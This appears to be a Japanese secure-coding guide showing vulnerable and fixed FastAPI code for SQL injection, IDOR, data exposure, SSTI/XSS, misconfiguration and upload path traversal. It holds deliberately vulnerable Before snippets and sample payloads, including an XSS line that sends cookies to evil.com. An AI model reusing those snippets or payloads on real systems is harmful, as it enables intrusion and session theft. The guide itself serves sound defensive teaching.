# セキュリティレビュー改善例: Before/After

## 概要

実際のコードにおけるセキュリティ改善例をBefore/After形式で示す。各例には脆弱性の種類、リスク、改善ポイントを明記する。

## 例1: SQLインジェクション

### Before（脆弱なコード）

```python
@router.get("/users")
def search_users(name: str = Query(None), role: str = Query(None)):
    query = "SELECT id, name, email FROM users WHERE 1=1"
    if name:
        query += f" AND name LIKE '%{name}%'"
    if role:
        query += f" AND role = '{role}'"
    cursor.execute(query)
    return cursor.fetchall()
```

**脆弱性**: SQLインジェクション（A03）
**深刻度**: Critical
**攻撃例**: `name=' OR '1'='1' --` で全ユーザー情報を取得可能

### After（安全なコード）

```python
from sqlalchemy import select, and_

@router.get("/users", response_model=list[UserResponse])
def search_users(
    name: str | None = Query(None, max_length=100),
    role: str | None = Query(None, max_length=50),
    current_user: User = Depends(get_current_user),
):
    stmt = select(User)
    conditions = []
    if name:
        conditions.append(User.name.ilike(f"%{name}%"))
    if role:
        conditions.append(User.role == role)
    if conditions:
        stmt = stmt.where(and_(*conditions))
    return session.execute(stmt).scalars().all()
```

**改善ポイント**:
- ORMを使用してSQLインジェクションを防止
- 入力の最大長を制限
- 認証を追加
- レスポンススキーマで返却フィールドを制限

## 例2: 認証・認可の不備

### Before（脆弱なコード）

```python
@router.get("/documents/{doc_id}")
def get_document(doc_id: str):
    doc = repository.find(doc_id)
    if not doc:
        return {"error": "Not found"}
    return doc

@router.delete("/documents/{doc_id}")
def delete_document(doc_id: str):
    repository.delete(doc_id)
    return {"message": "Deleted"}
```

**脆弱性**: アクセス制御の不備（A01）+ IDOR
**深刻度**: High
**攻撃例**: 任意の`doc_id`を指定して他人のドキュメントを閲覧・削除可能

### After（安全なコード）

```python
@router.get("/documents/{doc_id}", response_model=DocumentResponse)
def get_document(
    doc_id: str,
    current_user: User = Depends(get_current_user),
):
    doc = repository.find(doc_id)
    if not doc:
        raise HTTPException(status_code=404, detail="Document not found")
    if doc.owner_id != current_user.id and not current_user.has_role("admin"):
        raise HTTPException(status_code=403, detail="Access denied")
    return doc

@router.delete("/documents/{doc_id}", status_code=204)
def delete_document(
    doc_id: str,
    current_user: User = Depends(get_current_user),
):
    doc = repository.find(doc_id)
    if not doc:
        raise HTTPException(status_code=404, detail="Document not found")
    if doc.owner_id != current_user.id and not current_user.has_role("admin"):
        raise HTTPException(status_code=403, detail="Access denied")
    repository.delete(doc_id)
```

**改善ポイント**:
- 認証を追加（`get_current_user`）
- リソース所有者チェック（IDOR防止）
- 管理者ロールの考慮
- 適切なHTTPステータスコード
- レスポンススキーマで返却フィールドを制限

## 例3: 機密データの露出

### Before（脆弱なコード）

```python
class User(Base):
    __tablename__ = "users"
    id = Column(String, primary_key=True)
    name = Column(String)
    email = Column(String)
    password_hash = Column(String)
    ssn = Column(String)
    credit_card = Column(String)

@router.get("/users/{user_id}")
def get_user(user_id: str):
    user = session.query(User).get(user_id)
    return {
        "id": user.id,
        "name": user.name,
        "email": user.email,
        "password_hash": user.password_hash,  # パスワードハッシュを返却
        "ssn": user.ssn,                      # 社会保障番号を返却
        "credit_card": user.credit_card,       # クレジットカード番号を返却
    }
```

**脆弱性**: 機密データの露出（A02）
**深刻度**: High
**影響**: パスワードハッシュ、個人識別情報、金融情報が漏洩

### After（安全なコード）

```python
class UserResponse(BaseModel):
    id: str
    name: str
    email: str

    class Config:
        from_attributes = True

class UserDetailResponse(UserResponse):
    masked_ssn: str | None = None
    masked_credit_card: str | None = None

@router.get("/users/{user_id}", response_model=UserResponse)
def get_user(
    user_id: str,
    current_user: User = Depends(get_current_user),
):
    if current_user.id != user_id and not current_user.has_role("admin"):
        raise HTTPException(status_code=403)
    user = session.query(User).get(user_id)
    if not user:
        raise HTTPException(status_code=404)
    return user  # UserResponseに定義されたフィールドのみ返却

@router.get("/users/{user_id}/detail", response_model=UserDetailResponse)
def get_user_detail(
    user_id: str,
    current_user: User = Depends(get_current_user),
):
    if current_user.id != user_id:
        raise HTTPException(status_code=403)
    user = session.query(User).get(user_id)
    return UserDetailResponse(
        id=user.id,
        name=user.name,
        email=user.email,
        masked_ssn=f"***-**-{user.ssn[-4:]}" if user.ssn else None,
        masked_credit_card=f"****-****-****-{user.credit_card[-4:]}" if user.credit_card else None,
    )
```

**改善ポイント**:
- レスポンススキーマで公開フィールドを制限
- パスワードハッシュをレスポンスに含めない
- 機密情報はマスキングして返却
- 認証・認可を追加
- 詳細情報は本人のみアクセス可能

## 例4: XSSとテンプレートインジェクション

### Before（脆弱なコード）

```python
from jinja2 import Template

@router.get("/greeting")
def greeting(name: str = Query(...)):
    # ユーザー入力をテンプレートとして解釈（SSTI）
    template = Template(f"Hello, {name}!")
    return {"message": template.render()}

@router.post("/comments")
def create_comment(content: str = Form(...)):
    # HTMLサニタイズなしで保存
    repository.save({"content": content})
    return {"status": "saved"}
```

**脆弱性**: SSTI + Stored XSS（A03）
**深刻度**: Critical（SSTI）/ High（XSS）
**攻撃例**:
- SSTI: `name={{config}}` でサーバー設定を漏洩
- XSS: `content=<script>document.location='https://evil.com/?c='+document.cookie</script>`

### After（安全なコード）

```python
import html
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape())

@router.get("/greeting")
def greeting(name: str = Query(..., max_length=100)):
    # ユーザー入力をテンプレート変数として渡す
    safe_name = html.escape(name)
    return {"message": f"Hello, {safe_name}!"}

@router.post("/comments")
def create_comment(
    content: str = Form(..., max_length=10000),
    current_user: User = Depends(get_current_user),
):
    # HTMLサニタイズ
    safe_content = html.escape(content)
    repository.save({
        "content": safe_content,
        "user_id": current_user.id,
    })
    return {"status": "saved"}
```

**改善ポイント**:
- ユーザー入力をテンプレートとして解釈しない
- HTMLエスケープを実施
- 入力長の制限
- 認証の追加

## 例5: セキュリティ設定の不備

### Before（脆弱なコード）

```python
from fastapi import FastAPI

app = FastAPI(debug=True)  # 本番でもデバッグモード

SECRET_KEY = "my-secret-key"  # ハードコーディング

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# デバッグエンドポイントが本番に露出
@app.get("/debug/env")
def get_env():
    return dict(os.environ)

@app.get("/debug/users")
def get_all_users():
    return repository.find_all()
```

**脆弱性**: セキュリティ設定のミス（A05）
**深刻度**: High
**影響**: 環境変数（シークレット含む）の漏洩、CORS全開放、デバッグ情報の露出

### After（安全なコード）

```python
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    DEBUG: bool = False
    SECRET_KEY: str  # 環境変数から取得（必須）
    ALLOWED_ORIGINS: list[str] = ["https://app.example.com"]
    ENVIRONMENT: str = "production"

    class Config:
        env_file = ".env"

settings = Settings()

app = FastAPI(
    debug=settings.DEBUG,
    docs_url="/docs" if settings.DEBUG else None,      # 本番ではSwagger UIを無効化
    redoc_url="/redoc" if settings.DEBUG else None,
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)

# デバッグエンドポイントは開発環境のみ
if settings.DEBUG:
    @app.get("/debug/health")
    def debug_health():
        return {"status": "ok", "environment": settings.ENVIRONMENT}
```

**改善ポイント**:
- 環境変数によるシークレット管理
- デバッグモードの環境別制御
- CORSオリジンの限定
- デバッグエンドポイントの条件付き公開
- Swagger UIの本番環境での無効化
- 環境変数を返すエンドポイントの削除

## 例6: ファイルアップロードの脆弱性

### Before（脆弱なコード）

```python
import os

@router.post("/upload")
async def upload_file(file: UploadFile):
    # ファイル名をそのまま使用（パストラバーサル）
    file_path = f"/app/uploads/{file.filename}"
    with open(file_path, "wb") as f:
        content = await file.read()
        f.write(content)
    return {"path": file_path}
```

**脆弱性**: パストラバーサル + 無制限ファイルアップロード
**深刻度**: High
**攻撃例**: `filename=../../etc/cron.d/malicious` でサーバー上の任意の場所にファイルを配置

### After（安全なコード）

```python
import uuid
import magic
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads")
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".pdf"}
ALLOWED_MIME_TYPES = {"image/jpeg", "image/png", "image/gif", "application/pdf"}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

@router.post("/upload")
async def upload_file(
    file: UploadFile,
    current_user: User = Depends(get_current_user),
):
    # ファイルサイズチェック
    content = await file.read()
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail="File too large")

    # 拡張子チェック
    ext = Path(file.filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(status_code=400, detail="File type not allowed")

    # MIMEタイプチェック
    mime_type = magic.from_buffer(content, mime=True)
    if mime_type not in ALLOWED_MIME_TYPES:
        raise HTTPException(status_code=400, detail="File type not allowed")

    # 安全なファイル名を生成（UUIDを使用）
    safe_filename = f"{uuid.uuid4()}{ext}"
    file_path = UPLOAD_DIR / safe_filename

    # アップロードディレクトリ内であることを確認
    if not str(file_path.resolve()).startswith(str(UPLOAD_DIR.resolve())):
        raise HTTPException(status_code=400, detail="Invalid file path")

    file_path.write_bytes(content)

    return {"file_id": safe_filename}
```

**改善ポイント**:
- UUIDベースのファイル名生成（パストラバーサル防止）
- ファイルサイズの制限
- 拡張子のホワイトリストチェック
- MIMEタイプのマジックバイト検証
- パス解決後のディレクトリ確認
- 認証の追加
- 元のファイルパスをレスポンスに返さない

## まとめ

セキュリティ改善の共通パターン:

1. **入力を信用しない**: すべての外部入力にバリデーションを実施
2. **認証・認可を追加**: エンドポイントへのアクセス制御
3. **出力を制御**: レスポンスに含める情報を明示的に制限
4. **設定を外部化**: シークレットや環境依存の設定は環境変数で管理
5. **安全なAPIを使用**: 文字列連結の代わりにORM、パラメータ化クエリ
6. **エスケープを適用**: コンテキストに応じた出力エスケープ
